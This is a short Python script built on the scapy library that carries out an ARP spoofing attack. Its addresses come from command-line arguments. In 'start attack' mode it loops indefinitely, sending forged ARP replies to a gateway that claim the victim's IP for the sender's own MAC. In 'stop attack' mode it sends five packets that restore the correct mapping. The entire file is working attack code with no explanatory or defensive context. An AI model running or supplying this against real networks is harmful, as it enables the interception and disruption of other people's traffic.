from scapy.all import ARP, Ether, sendp
import sys
import time

gatewayIP = sys.argv[1]
targetIP = sys.argv[2]
gatewayMAC = sys.argv[3]
targetMAC = sys.argv[4]
mode = sys.argv[5]

# mode = 0 means start attack, mode = 1 means stop attack
if mode == "0":
    sendp(Ether(dst=gatewayMAC)/ARP(psrc=targetIP, pdst=gatewayIP), inter=1, loop=1)
else:
    for i in range(5):
        sendp(Ether(dst=gatewayMAC, src=targetMAC) /
              ARP(psrc=targetIP, pdst=gatewayIP))
